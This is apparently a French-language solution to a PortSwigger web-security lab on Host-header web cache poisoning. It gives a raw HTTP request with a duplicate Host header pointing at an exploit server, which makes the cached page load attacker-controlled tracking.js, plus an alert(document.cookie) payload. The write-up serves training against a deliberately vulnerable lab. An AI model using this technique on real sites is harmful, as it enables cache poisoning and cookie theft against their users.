# Lab

https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

## Solution

Sur la page d'accueil, on voit qu'il y a une balise `script` qui charge un fichier `/resources/js/tracking.js` depuis le domaine actif.

On peut donc essayer de modifier le header `Host` pour modifier le domaine de la source du fichier `tracking.js` si l'implémentaion du serveur est vulnérable à une attaque.

Malheureusement il ya une sécrutité qui empêche la modification du header `Host`.

On peut essayer de créer une requête ambiguë en ajoutant un header `Host` dans la requête en plus de celui qui est déjà présent.

```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

On voit que le cache du serveur a été empoisonné et que le fichier `tracking.js` est chargé depuis notre serveur.

Maintenant on peut créervia l'exploit server un fichier `tracking.js` qui contient le code suivant:

```js
alert(document.cookie);
```

Ce qui nous permet de valider le lab.